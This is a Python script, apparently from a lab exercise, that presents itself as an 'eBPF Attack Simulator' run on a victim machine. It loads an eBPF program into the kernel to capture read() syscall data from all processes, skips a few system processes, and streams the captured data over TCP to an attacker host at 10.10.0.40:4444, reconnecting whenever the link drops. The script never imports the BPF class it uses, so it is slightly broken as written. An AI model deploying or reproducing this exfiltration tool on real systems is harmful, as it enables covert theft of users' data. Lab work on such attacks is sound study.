import socket
import struct
import ctypes
import sys
import os
import time
import signal
from datetime import datetime

# The assumption with this attack is that credentials have been phished
# make sure to run as sudo.


# lab config
ATTACKER_IP = "10.10.0.40"
ATTACKER_PORT = 4444
VICTIM_IP = "10.10.0.20"



# grabs ebpf attack file
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BPF_SOURCE = os.path.join(SCRIPT_DIR, "intercept.c")

if not os.path.exists(BPF_SOURCE):
    print(f"[!] Cannot find {BPF_SOURCE}")
    print("[!] Make sure intercept.c is in the same directory")
    sys.exit(1)


# defines socket for exfil
exfil_sock = None
running = True
def signal_handler(sig, frame):
    global running
    print("\n[*] Shutting down...")
    running = False
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


# sets up tcp copnnection
def connect_to_attacker():
    """Establish TCP connection to the attacker's receiver"""
    global exfil_sock
    while running:
        try:
            print(f"[*] Connecting to attacker at {ATTACKER_IP}:{ATTACKER_PORT}...")
            exfil_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            exfil_sock.settimeout(5)
            exfil_sock.connect((ATTACKER_IP, ATTACKER_PORT))
            print(f"[+] Connected to attacker at {ATTACKER_IP}:{ATTACKER_PORT}")
            return True
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            print(f"[!] Connection failed: {e}. Retrying in 3 seconds...")
            time.sleep(3)
    return False


# sends info to attacker machine
def send_to_attacker(data: bytes):
    """Send intercepted data to attacker with length prefix"""
    global exfil_sock
    try:
        length = struct.pack(">I", len(data))
        exfil_sock.sendall(length + data)
        return True
    except (BrokenPipeError, OSError):
        print("[!] Connection to attacker lost, reconnecting...")
        connect_to_attacker()
        return False

# formats info for send off
def format_event(pid, uid, comm, bytes_read, data_bytes):
    """Format an intercepted event as a readable string"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        data_str = data_bytes.decode('utf-8', errors='replace').strip()
        data_str = ''.join(c if c.isprintable() else '.' for c in data_str)
    except Exception:
        data_str = data_bytes.hex()

    return (
        f"[{timestamp}] "
        f"PID={pid} UID={uid} COMM={comm.decode('utf-8', errors='replace').strip(chr(0))} "
        f"BYTES={bytes_read} "
        f"DATA={data_str[:200]}"
    )


def load_and_run():
    """This loads the ebpf attack in"""

    print("[*] Loading eBPF program...")

    # reads the eBPF C source
    with open(BPF_SOURCE, 'r') as f:
        bpf_source = f.read()

    # load into kernel
    try:
        b = BPF(text=bpf_source)
        print("[+] eBPF program loaded into kernel successfully")
    except Exception as e:
        print(f"[!] Failed to load eBPF program: {e}")
        sys.exit(1)

    print(f"[*] Intercepting read() syscalls on all processes...")
    print(f"[*] Exfiltrating to {ATTACKER_IP}:{ATTACKER_PORT}")
    print("[*] Press Ctrl+C to stop\n")

    # Define the event structure matching our eBPF struct
    class Event(ctypes.Structure):
        _fields_ = [
            ("pid", ctypes.c_uint32),
            ("uid", ctypes.c_uint32),
            ("bytes_read", ctypes.c_int64),
            ("data", ctypes.c_char * 256),
            ("comm", ctypes.c_char * 16),
        ]

    intercepted_count = 0

    def handle_event(cpu, data, size):
        nonlocal intercepted_count
        event = ctypes.cast(data, ctypes.POINTER(Event)).contents

        # skips exfiltrator process to avoid feedback loop and other filtering
        if event.pid == os.getpid():
            return
        comm_str = event.comm.decode('utf-8', errors='replace').strip('\x00')
        if comm_str in ('sshd', 'sudo', 'systemd', 'python3'):
            return
        if event.bytes_read < 10:
            return

        # format data to string and count interecepted
        formatted = format_event(
            event.pid,
            event.uid,
            event.comm,
            event.bytes_read,
            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256]))
        intercepted_count += 1
        print(f"[INTERCEPT #{intercepted_count}] {formatted}")

        # send data over TCP to the attacker receiver
        send_to_attacker(formatted.encode('utf-8'))

    # open the ring buffer and set callback
    b["intercepted_data"].open_perf_buffer(handle_event)
    print("[+] Ring buffer opened, waiting for intercepted data...\n")

    # polls ring buffere from intercept on loop
    while running:
        try:
            b.perf_buffer_poll(100)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Ring buffer error: {e}")
            break
    print(f"\n[*] Total events intercepted: {intercepted_count}")
    print("[*] Detaching eBPF program from kernel...")
    b.cleanup()
    print("[*] Done")

# runs program
def main():
    print("=" * 60)
    print("  eBPF Attack Simulator - Victim Side Exfiltrator")
    print("  For educational/research use in lab environment only")
    print("=" * 60)
    print()
    print(f"[*] Victim VM:   {VICTIM_IP}")
    print(f"[*] Attacker VM: {ATTACKER_IP}:{ATTACKER_PORT}")
    print()

    # checks for attack connection first
    if not connect_to_attacker():
        print("[!] Could not connect to attacker. Is receiver.py running on Kali?")
        sys.exit(1)

    # starts attack and interception
    load_and_run()

    # close attacker connection
    if exfil_sock:
        exfil_sock.close()


if __name__ == "__main__":
    main()